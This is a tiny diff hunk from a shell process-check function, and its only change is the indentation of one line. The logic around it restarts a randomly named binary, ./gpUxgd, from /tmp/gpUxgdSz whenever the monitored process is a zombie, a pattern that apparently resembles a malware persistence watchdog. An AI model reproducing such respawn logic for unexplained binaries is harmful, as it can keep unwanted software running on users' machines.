@@ -14,7 +14,7 @@ check_process_by_name() {
             if [[ "$status" != "Z" ]]; then
                 echo "Process '$process_name' (PID: $pid) is running."
             else
-	    	    cd /tmp/gpUxgdSz
+	    	cd /tmp/gpUxgdSz
                 ./gpUxgd
             fi
         done
